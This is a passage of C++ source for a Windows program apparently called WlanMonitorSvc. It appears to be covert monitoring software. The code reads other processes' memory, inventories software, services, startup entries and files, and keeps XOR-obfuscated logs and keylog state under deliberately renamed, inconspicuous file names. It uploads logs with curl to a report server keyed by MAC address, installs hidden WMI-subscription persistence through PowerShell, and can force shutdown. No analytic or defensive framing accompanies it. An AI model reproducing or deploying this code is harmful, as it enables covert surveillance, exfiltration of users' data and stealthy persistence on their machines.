    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        return "{\"error\":\"OpenProcess failed: " + std::to_string(GetLastError()) + "\"}";
    }

    int checked = 0;
    int resultCount = 0;
    const int maxResults = 200;
    std::string results = "[";
    size_t start = 0;
    while (start < addressCsv.size() && resultCount < maxResults) {
        size_t comma = addressCsv.find(',', start);
        std::string item = addressCsv.substr(start, comma == std::string::npos ? std::string::npos : comma - start);
        TrimString(item);
        start = (comma == std::string::npos) ? addressCsv.size() : comma + 1;
        if (item.empty()) continue;

        ULONGLONG address = ParseAddressValue(item);
        if (address == 0) continue;
        ++checked;

        std::vector<BYTE> buffer(max((SIZE_T)64, pattern.size()));
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(hProcess, (LPCVOID)(ULONG_PTR)address, buffer.data(), buffer.size(), &bytesRead) || bytesRead < pattern.size()) {
            continue;
        }
        if (!std::equal(pattern.begin(), pattern.end(), buffer.begin())) {
            continue;
        }

        MEMORY_BASIC_INFORMATION mbi;
        ZeroMemory(&mbi, sizeof(mbi));
        VirtualQueryEx(hProcess, (LPCVOID)(ULONG_PTR)address, &mbi, sizeof(mbi));
        SIZE_T previewLen = min((SIZE_T)64, bytesRead);
        if (resultCount > 0) results += ",";
        results += "{\"Address\":\"" + HexPtrString((ULONG_PTR)address) + "\"" +
                   ",\"RegionBase\":\"" + HexPtrString((ULONG_PTR)mbi.BaseAddress) + "\"" +
                   ",\"Protect\":\"" + ProtectToString(mbi.Protect) + "\"" +
                   ",\"Type\":\"" + TypeToString(mbi.Type) + "\"" +
                   ",\"Preview\":\"" + EscapeJsonString(BytesToAsciiPreview(buffer.data(), previewLen)) + "\"}";
        ++resultCount;
    }
    CloseHandle(hProcess);

    results += "]";
    std::string res = "{";
    res += "\"PatternBytes\":" + std::to_string((ULONGLONG)pattern.size()) + ",";
    res += "\"Checked\":" + std::to_string(checked) + ",";
    res += "\"Truncated\":" + std::string(resultCount >= maxResults ? "true" : "false") + ",";
    res += "\"Results\":" + results;
    res += "}";
    return res;
}

double GetCpuUsageNative() {
    FILETIME idle1, kernel1, user1;
    FILETIME idle2, kernel2, user2;
    GetSystemTimes(&idle1, &kernel1, &user1);
    Sleep(100);
    GetSystemTimes(&idle2, &kernel2, &user2);

    auto toUL = [](FILETIME ft) {
        ULARGE_INTEGER ul;
        ul.LowPart = ft.dwLowDateTime; ul.HighPart = ft.dwHighDateTime;
        return ul.QuadPart;
    };
    ULONGLONG idleDiff = toUL(idle2) - toUL(idle1);
    ULONGLONG sysDiff = (toUL(kernel2) - toUL(kernel1)) + (toUL(user2) - toUL(user1));
    if (sysDiff == 0) return 0.0;
    return ((sysDiff - idleDiff) * 100.0) / sysDiff;
}

std::string GetPerfInfoNative() {
    static std::string cpuName = "";
    static std::string gpuName = "";
    if (cpuName.empty()) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buf[256] = {0};
            DWORD size = sizeof(buf);
            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)buf, &size) == ERROR_SUCCESS) {
                cpuName = buf;
                cpuName.erase(0, cpuName.find_first_not_of(" \t\r\n"));
                cpuName.erase(cpuName.find_last_not_of(" \t\r\n") + 1);
            }
            RegCloseKey(hKey);
        }
        if (cpuName.empty()) cpuName = "Unknown CPU";

        DISPLAY_DEVICEA dd;
        dd.cb = sizeof(dd);
        if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) {
            gpuName = dd.DeviceString;
        } else {
            gpuName = "Unknown GPU";
        }
    }

    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    double cpu = GetCpuUsageNative();
    std::string res = "{";
    res += "\"CPU\":" + std::to_string(cpu) + ",";
    res += "\"MemTotal\":" + std::to_string(memInfo.ullTotalPhys) + ",";
    res += "\"MemFree\":" + std::to_string(memInfo.ullAvailPhys) + ",";
    res += "\"CPU_Name\":\"" + EscapeJsonString(AnsiToUtf8(cpuName)) + "\",";
    res += "\"GPU_Name\":\"" + EscapeJsonString(AnsiToUtf8(gpuName)) + "\"";
    res += "}";
    return res;
}

std::string GetStartupListNative() {
    std::string res = "[";
    auto readReg = [&](HKEY root, const char* subKey, const char* loc) {
        HKEY hKey;
        if (RegOpenKeyExA(root, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD i = 0; char val[MAX_PATH]; DWORD valSize = MAX_PATH; DWORD type; BYTE data[1024]; DWORD dataSize = 1024;
            while (RegEnumValueA(hKey, i, val, &valSize, NULL, &type, data, &dataSize) == ERROR_SUCCESS) {
                if (type == REG_SZ || type == REG_EXPAND_SZ) {
                    if (res.length() > 1) res += ",";
                    std::string valStr = val; std::string dataStr = (char*)data;
                    res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(valStr)) + "\",\"Command\":\"" + EscapeJsonString(AnsiToUtf8(dataStr)) + "\",\"Location\":\"" + EscapeJsonString(loc) + "\"}";
                }
                i++; valSize = MAX_PATH; dataSize = 1024;
            }
            RegCloseKey(hKey);
        }
    };
    readReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM");
    readReg(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU");
    res += "]";
    return res;
}

std::string GetServiceListNative() {
    std::string res = "[";
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCM) {
        DWORD bytesNeeded = 0; DWORD servicesReturned = 0; DWORD resumeHandle = 0;
        EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle, NULL);
        if (GetLastError() == ERROR_MORE_DATA) {
            LPENUM_SERVICE_STATUS_PROCESSA pServices = (LPENUM_SERVICE_STATUS_PROCESSA)malloc(bytesNeeded);
            if (pServices && EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)pServices, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle, NULL)) {
                for (DWORD i = 0; i < servicesReturned; i++) {
                    if (res.length() > 1) res += ",";
                    std::string sName = pServices[i].lpServiceName;
                    std::string dName = pServices[i].lpDisplayName;
                    std::string statusStr = "Unknown";
                    DWORD state = pServices[i].ServiceStatusProcess.dwCurrentState;
                    if (state == SERVICE_RUNNING) statusStr = "Running";
                    else if (state == SERVICE_STOPPED) statusStr = "Stopped";
                    else if (state == SERVICE_START_PENDING) statusStr = "Start_Pending";
                    else if (state == SERVICE_STOP_PENDING) statusStr = "Stop_Pending";
                    res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(sName)) + "\",\"DisplayName\":\"" + EscapeJsonString(AnsiToUtf8(dName)) + "\",\"Status\":\"" + statusStr + "\"}";
                }
            }
            if (pServices) free(pServices);
        }
        CloseServiceHandle(hSCM);
    }
    res += "]";
    return res;
}

std::string GetSoftwareListNative() {
    std::string res = "[";
    auto readSoftReg = [&](HKEY root, const char* subKey) {
        HKEY hKey;
        if (RegOpenKeyExA(root, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD i = 0; char keyName[256]; DWORD keyNameSize = 256;
            while (RegEnumKeyExA(hKey, i, keyName, &keyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                HKEY hSubKey;
                if (RegOpenKeyExA(hKey, keyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char dispName[256] = {0}; DWORD dnSize = 256;
                    char dispVer[256] = {0}; DWORD dvSize = 256;
                    char pub[256] = {0}; DWORD pubSize = 256;
                    char uninstall[1024] = {0}; DWORD unSize = 1024;
                    char modify[1024] = {0}; DWORD modSize = 1024;
                    char installDate[256] = {0}; DWORD idSize = 256;
                    if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (LPBYTE)dispName, &dnSize) == ERROR_SUCCESS) {
                        RegQueryValueExA(hSubKey, "DisplayVersion", NULL, NULL, (LPBYTE)dispVer, &dvSize);
                        RegQueryValueExA(hSubKey, "Publisher", NULL, NULL, (LPBYTE)pub, &pubSize);
                        RegQueryValueExA(hSubKey, "UninstallString", NULL, NULL, (LPBYTE)uninstall, &unSize);
                        RegQueryValueExA(hSubKey, "ModifyPath", NULL, NULL, (LPBYTE)modify, &modSize);
                        RegQueryValueExA(hSubKey, "InstallDate", NULL, NULL, (LPBYTE)installDate, &idSize); // YYYYMMDD 格式方便前端排序

                        if (res.length() > 1) res += ",";
                        res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(dispName)) + 
                               "\",\"Version\":\"" + EscapeJsonString(AnsiToUtf8(dispVer)) + 
                               "\",\"Publisher\":\"" + EscapeJsonString(AnsiToUtf8(pub)) + 
                               "\",\"UninstallString\":\"" + EscapeJsonString(AnsiToUtf8(uninstall)) + 
                               "\",\"ModifyPath\":\"" + EscapeJsonString(AnsiToUtf8(modify)) + 
                               "\",\"InstallDate\":\"" + EscapeJsonString(AnsiToUtf8(installDate)) + "\"}";
                    }
                    RegCloseKey(hSubKey);
                }
                i++; keyNameSize = 256;
            }
            RegCloseKey(hKey);
        }
    };
    readSoftReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    readSoftReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    res += "]";
    return res;
}

std::string GetFileListNative(const std::string& path) {
    std::string res = "[";
    if (path == "ROOT" || path == "此电脑" || path.empty()) {
        char driveBuf[256];
        DWORD len = GetLogicalDriveStringsA(sizeof(driveBuf) - 1, driveBuf);
        if (len > 0 && len <= 256) {
            char* drive = driveBuf;
            bool first = true;
            while (*drive) {
                if (!first) res += ",";
                first = false;
                std::string nameStr = drive;
                if (!nameStr.empty() && nameStr.back() == '\\') nameStr.pop_back();
                res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(nameStr)) + "\",\"Length\":0,\"LastWriteTime\":\"\",\"IsDir\":true}";
                drive += strlen(drive) + 1;
            }
        }
    } else {
        std::string searchPath = path;
        if (!searchPath.empty() && searchPath.back() != '\\' && searchPath.back() != '/') {
            searchPath += "\\";
        }
        searchPath += "*";
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            bool first = true;
            do {
                if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
                if (!first) res += ",";
                first = false;

                bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                ULARGE_INTEGER ulSz;
                ulSz.HighPart = fd.nFileSizeHigh;
                ulSz.LowPart = fd.nFileSizeLow;

                char timeBuf[64] = {0};
                FILETIME ftLoc;
                if (FileTimeToLocalFileTime(&fd.ftLastWriteTime, &ftLoc)) {
                    SYSTEMTIME st;
                    if (FileTimeToSystemTime(&ftLoc, &st)) {
                        sprintf_s(timeBuf, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
                    }
                }

                res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(fd.cFileName)) + "\",\"Length\":" + std::to_string(ulSz.QuadPart) + ",\"LastWriteTime\":\"" + timeBuf + "\",\"IsDir\":" + (isDir ? "true" : "false") + "}";
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }
    res += "]";
    return res;
}
// -----------------------------------------------------------------

// 获取当前时间的字符串表示用于记录日志
std::string GetCurrentTimeStr() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buffer[256];
    sprintf_s(buffer, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return std::string(buffer);
}

// 获取当前程序的完整运行路径
std::string GetExePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

bool IsUsableExeFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        return false;
    }

    std::streamoff size = file.tellg();
    if (size < 1024) {
        return false;
    }

    file.seekg(0, std::ios::beg);
    char mz[2] = {};
    file.read(mz, sizeof(mz));
    return file.good() && mz[0] == 'M' && mz[1] == 'Z';
}

bool HasWirelessAdapterPresent() {
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS || hClient == NULL) {
        return false;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    bool hasWireless = false;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult == ERROR_SUCCESS && pIfList != NULL) {
        hasWireless = pIfList->dwNumberOfItems > 0;
        WlanFreeMemory(pIfList);
    }

    WlanCloseHandle(hClient, NULL);
    return hasWireless;
}

bool IsLikelyLaptopDevice() {
    SYSTEM_POWER_STATUS status{};
    if (!GetSystemPowerStatus(&status)) {
        return false;
    }

    return status.BatteryFlag != 128 && status.BatteryFlag != 255;
}

std::string GetDeviceTypeForReport() {
    if (IsLikelyLaptopDevice()) {
        return "laptop";
    }
    return "desktop";
}

// 先声明，让后面可以调用
std::string ExecCmd(const std::string& cmd, bool outputIsUtf8 = false);
std::string GetMacAddress();
std::string UrlEncode(const std::string& str);
std::string EncryptString(const std::string& data);
std::string DecryptString(const std::string& hexStr);
void TrimString(std::string& s);

// 加密实现：使用 XOR 和 Hex 编码
std::string EncryptString(const std::string& data) {
    const std::string key = "PowerOFF2026";
    std::string encrypted;

    for (size_t i = 0; i < data.length(); ++i) {
        unsigned char byte = (unsigned char)data[i];
        unsigned char keyChar = key[i % key.length()];
        unsigned char xorByte = byte ^ keyChar;

        // 转换为 Hex 字符串
        char hexBuf[3];
        sprintf_s(hexBuf, sizeof(hexBuf), "%02X", xorByte);
        encrypted += hexBuf;
    }

    return encrypted;
}

// 解密实现：反向 XOR 和 Hex 解码
std::string DecryptString(const std::string& hexStr) {
    const std::string key = "PowerOFF2026";
    std::string decrypted;

    for (size_t i = 0; i < hexStr.length(); i += 2) {
        if (i + 1 < hexStr.length()) {
            std::string hexByte = hexStr.substr(i, 2);
            unsigned char xorByte = (unsigned char)std::stoul(hexByte, nullptr, 16);
            unsigned char keyChar = key[(i / 2) % key.length()];
            unsigned char originalByte = xorByte ^ keyChar;
            decrypted += (char)originalByte;
        }
    }

    return decrypted;
}

void EnsureLocalStateDir() {
    CreateDirectoryA(LOCAL_STATE_DIR, NULL);
}

bool ReadWholeFile(const std::string& path, std::string& data) {
    std::ifstream ifs(path, std::ios::binary);
    if (!ifs.is_open()) {
        return false;
    }
    data.assign((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    return true;
}

bool WriteEncryptedLocalFile(const std::string& path, const std::string& plain) {
    EnsureLocalStateDir();
    std::ofstream ofs(path, std::ios::binary | std::ios::trunc);
    if (!ofs.is_open()) {
        return false;
    }
    std::string encrypted = EncryptString(plain);
    ofs.write(encrypted.data(), encrypted.size());
    return true;
}

bool ReadEncryptedLocalFile(const std::string& path, const std::string& legacyPath, std::string& plain) {
    std::string encrypted;
    if (ReadWholeFile(path, encrypted)) {
        TrimString(encrypted);
        plain = DecryptString(encrypted);
        return true;
    }

    if (!legacyPath.empty() && ReadWholeFile(legacyPath, plain)) {
        WriteEncryptedLocalFile(path, plain);
        DeleteFileA(legacyPath.c_str());
        return true;
    }

    return false;
}

void MigrateEncryptedStateName(const std::string& oldPath, const std::string& newPath) {
    if (GetFileAttributesA(newPath.c_str()) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(oldPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return;
    }

    EnsureLocalStateDir();
    MoveFileExA(oldPath.c_str(), newPath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
}

void MigrateObviousLocalStateNames() {
    MigrateEncryptedStateName(LEGACY_ACTIVE_WND_STATE, ACTIVE_WND_STATE);
    MigrateEncryptedStateName(LEGACY_VOLUME_STATE, VOLUME_STATE);
    MigrateEncryptedStateName(LEGACY_KEYLOG_CFG_STATE, KEYLOG_CFG_STATE);
    MigrateEncryptedStateName(LEGACY_KEYLOG_STATE, KEYLOG_STATE);
    MigrateEncryptedStateName(LEGACY_MEDIA_BOUNCE_CFG_STATE, MEDIA_BOUNCE_CFG_STATE);
    MigrateEncryptedStateName(LEGACY_WIFI_SHUTDOWN_EXEMPT_STATE, WIFI_SHUTDOWN_EXEMPT_CFG);
}

bool LocalStateExists(const std::string& path, const std::string& legacyPath) {
    if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
        return true;
    }
    if (!legacyPath.empty() && GetFileAttributesA(legacyPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        std::string ignored;
        ReadEncryptedLocalFile(path, legacyPath, ignored);
        return true;
    }
    return false;
}

void DeleteLocalState(const std::string& path, const std::string& legacyPath) {
    DeleteFileA(path.c_str());
    if (!legacyPath.empty()) {
        DeleteFileA(legacyPath.c_str());
    }
}

void AppendEncryptedLocalFile(const std::string& path, const std::string& legacyPath, const std::string& addition) {
    std::string existing;
    ReadEncryptedLocalFile(path, legacyPath, existing);
    existing += addition;
    WriteEncryptedLocalFile(path, existing);
}

void MoveOrDeleteLegacyFile(const std::string& oldPath, const std::string& newPath) {
    if (GetFileAttributesA(oldPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return;
    }

    if (GetFileAttributesA(newPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        MoveFileExA(oldPath.c_str(), newPath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
    } else {
        DeleteFileA(oldPath.c_str());
    }
}

void MigrateExeSideLogNames() {
    std::string exePath = GetExePath();
    std::string exeDir = exePath.substr(0, exePath.find_last_of("\\/"));
    std::string mainLog = exeDir + "\\l01.wms";
    std::string updaterLog = exeDir + "\\l02.wms";

    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.txt", mainLog);
    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.wmslog", mainLog);
    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Updater_Log.txt", updaterLog);
    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Updater_Log.wmslog", updaterLog);
}

// 独立异步线程上传本地日志到云端
void UploadLogToServer() {
    std::thread([]() {
        std::string exePath = GetExePath();
        std::string exeDir = exePath.substr(0, exePath.find_last_of("\\/"));
        std::string mac = GetMacAddress();
        std::string baseUrl = REPORT_URL_BASE;
        size_t pos = baseUrl.rfind("/report");
        if (pos != std::string::npos) {
            baseUrl = baseUrl.substr(0, pos);
        }

        struct LogUploadTarget {
            const char* fileName;
            const char* kind;
        };

        const LogUploadTarget targets[] = {
            {"l01.wms", "main"},
            {"l02.wms", "update"},
        };

        for (const auto& target : targets) {
            std::string logPath = exeDir + "\\" + target.fileName;
            if (GetFileAttributesA(logPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                continue;
            }

            std::string targetUrl = baseUrl + "/api/upload_log/" + UrlEncode(mac) + "?kind=" + target.kind;
            std::string curlCmd = "curl.exe -s -m 12 -k -F \"file=@" + logPath + "\" \"" + targetUrl + "\"";
            ExecCmd(curlCmd, false);
        }
    }).detach();
}

// 写入加密日志到程序同目录下的 WlanMonitorSvc_Log.wmslog
void WriteLog(const std::string& message) {
    std::string exePath = GetExePath();
    std::string exeDir = exePath.substr(0, exePath.find_last_of("\\/"));
    std::string logPath = exeDir + "\\l01.wms";
    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.txt", logPath);
    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.wmslog", logPath);

    // 限制日志大小，超过则清空（防止日志无限增长）
    std::ifstream checkFile(logPath, std::ios::ate | std::ios::binary);
    bool isTooLarge = false;
    if (checkFile.is_open()) {
        if (checkFile.tellg() > 2 * 1024 * 1024) { // 大于2MB
            isTooLarge = true;
        }
        checkFile.close();
    }

    std::ofstream logFile(logPath, isTooLarge ? std::ios::trunc : std::ios::app);
    if (logFile.is_open()) {
        std::string rawLog = "[" + GetCurrentTimeStr() + "] " + message;
        std::string encryptedLog = EncryptString(rawLog);
        logFile << encryptedLog << std::endl;
        logFile.close();
    }
}

bool LaunchUpdaterForRecovery(const std::string& currentExePath, const std::string& newExePath) {
    std::string updaterPath = currentExePath + ".updater.exe";
    if (!IsUsableExeFile(updaterPath) || !IsUsableExeFile(newExePath)) {
        return false;
    }

    DeleteFileA((currentExePath + ".up_lock").c_str());

    std::string updaterParams = "\"" + currentExePath + "\" \"" + newExePath + "\"";
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "open";
    sei.lpFile = updaterPath.c_str();
    sei.lpParameters = updaterParams.c_str();
    sei.nShow = SW_HIDE;

    if (ShellExecuteExA(&sei)) {
        WriteLog("Update recovery: unfinished update detected; updater relaunched.");
        return true;
    }

    WriteLog("Update recovery: failed to relaunch updater, error=" + std::to_string(GetLastError()));
    return false;
}

bool RecoverInterruptedUpdateIfNeeded() {
    std::string currentExePath = GetExePath();
    std::string updateExitFlag = currentExePath + ".update_exit";
    bool hadInterruptedMarker = DeleteFileA(updateExitFlag.c_str()) != FALSE;
    if (hadInterruptedMarker) {
        WriteLog("Update recovery: stale update_exit flag removed after interrupted update.");
    }

    std::string newExePath = currentExePath + ".new";
    if (IsUsableExeFile(newExePath)) {
        if (LaunchUpdaterForRecovery(currentExePath, newExePath)) {
            return true;
        }
    } else {
        DeleteFileA(newExePath.c_str());
    }

    std::string stagedSearch = currentExePath + ".new.updating_*";
    WIN32_FIND_DATAA fd{};
    HANDLE hFind = FindFirstFileA(stagedSearch.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        std::string exeDir = currentExePath.substr(0, currentExePath.find_last_of("\\/") + 1);
        do {
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
                continue;
            }

            std::string stagedPath = exeDir + fd.cFileName;
            if (!IsUsableExeFile(stagedPath)) {
                DeleteFileA(stagedPath.c_str());
                continue;
            }

            DeleteFileA(newExePath.c_str());
            if (!MoveFileExA(stagedPath.c_str(), newExePath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                WriteLog("Update recovery: failed to restore staged exe, error=" + std::to_string(GetLastError()));
                continue;
            }

            FindClose(hFind);
            if (LaunchUpdaterForRecovery(currentExePath, newExePath)) {
                return true;
            }
            return false;
        } while (FindNextFileA(hFind, &fd));

        FindClose(hFind);
    }

    if (hadInterruptedMarker) {
        DeleteFileA((currentExePath + ".up_lock").c_str());
        WriteLog("Update recovery: no staged update found; update lock cleared for retry.");
    }

    return false;
}


#ifndef SERVICE_CONFIG_FAILURE_ACTIONS_FLAG
#define SERVICE_CONFIG_FAILURE_ACTIONS_FLAG 4
typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
    BOOL fFailureActionsOnNonCrashFailures;
} SERVICE_FAILURE_ACTIONS_FLAG, *LPSERVICE_FAILURE_ACTIONS_FLAG;
#endif

// 注册 WMI 订阅实现开机自启；保持 WMI 方案，不切换为 Windows Service。
void InstallWMIAutoStart() {
    std::string exePath = GetExePath();
    WriteLog("正在注册 WMI 订阅自启，触发时间为开机5s...");

    std::string psCmd = 
        "powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -Command \""
        "$NS='root\\subscription';"
        "$N='WlanMonitorSvc_WMI';"
        "$b=Get-WmiObject -Namespace $NS -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match $N }; if($b){$b|Remove-WmiObject};"
        "$c=Get-WmiObject -Namespace $NS -Class CommandLineEventConsumer -Filter \\\"Name='$N'\\\"; if($c){$c|Remove-WmiObject};"
        "$f=Get-WmiObject -Namespace $NS -Class __EventFilter -Filter \\\"Name='$N'\\\"; if($f){$f|Remove-WmiObject};"
        "$Q='SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 5 AND PreviousInstance.SystemUpTime < 5';"
        "$FI=Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name=$N;EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=$Q};"
        "$Path='" + exePath + "';"
        "$cmdL=[char]34+$Path+[char]34;"
        "$CI=Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{Name=$N;CommandLineTemplate=$cmdL};"
        "Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$FI;Consumer=$CI};"
        "\"";
    ExecCmd(psCmd);
    WriteLog("成功：WMI 自启注册完毕");

}

// UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
std::string Utf8ToAnsi(const std::string& utf8Str) {
    if (utf8Str.empty()) return "";
    int wLen = MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, NULL, 0);
    if (wLen <= 0) return utf8Str;
    std::wstring wStr(wLen, 0);
    MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, &wStr[0], wLen);
    int aLen = WideCharToMultiByte(CP_ACP, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
    if (aLen <= 0) return utf8Str;
    std::string aStr(aLen, 0);
    WideCharToMultiByte(CP_ACP, 0, wStr.c_str(), -1, &aStr[0], aLen, NULL, NULL);
    return std::string(aStr.c_str()); 
}

// ANSI 转 UTF-8发给服务器
std::string AnsiToUtf8(const std::string& ansiStr) {
    if (ansiStr.empty()) return "";
    int wLen = MultiByteToWideChar(CP_ACP, 0, ansiStr.c_str(), -1, NULL, 0);
    if (wLen <= 0) return ansiStr;
    std::wstring wStr(wLen, 0);
    MultiByteToWideChar(CP_ACP, 0, ansiStr.c_str(), -1, &wStr[0], wLen);
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
    if (utf8Len <= 0) return ansiStr;
    std::string utf8Str(utf8Len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, &utf8Str[0], utf8Len, NULL, NULL);
    return std::string(utf8Str.c_str());
}

std::string WideToUtf8(const std::wstring& wideStr) {
    if (wideStr.empty()) return "";
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, NULL, 0, NULL, NULL);
    if (utf8Len <= 0) return "";
    std::string utf8Str(utf8Len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, &utf8Str[0], utf8Len, NULL, NULL);
    while (!utf8Str.empty() && utf8Str.back() == '\0') utf8Str.pop_back();
    return utf8Str;
}

// 调用底层API进行强制关机
void ForceShutdown() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // 获取进程令牌
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // 获取关机特权 LUID
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // 赋予当前进程关机特权
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    }

    // 发送关机命令 (EWX_POWEROFF 关闭并断电 | EWX_FORCE 强制关闭应用不提示)
    ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);

    // 备用方案：隐藏调用系统shutdown命令兜底
    WinExec("shutdown.exe -s -f -t 0", SW_HIDE);
}

bool EnableWifiRadioByWlanApi() {
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS || hClient == NULL) {
        WriteLog("WLAN radio enable: WlanOpenHandle failed, error=" + std::to_string(dwResult));
        return false;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    bool changedAny = false;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult == ERROR_SUCCESS && pIfList != NULL) {
        for (DWORD i = 0; i < pIfList->dwNumberOfItems; ++i) {
            PWLAN_RADIO_STATE pRadioState = NULL;
            DWORD dataSize = 0;
            WLAN_OPCODE_VALUE_TYPE opCodeType{};
            DWORD queryResult = WlanQueryInterface(
                hClient,
                &pIfList->InterfaceInfo[i].InterfaceGuid,
                wlan_intf_opcode_radio_state,
                NULL,
                &dataSize,
                reinterpret_cast<PVOID*>(&pRadioState),
                &opCodeType);

            if (queryResult != ERROR_SUCCESS || pRadioState == NULL) {
                WriteLog("WLAN radio enable: WlanQueryInterface radio_state failed for interface " + std::to_string(i) + ", error=" + std::to_string(queryResult));
                continue;
            }
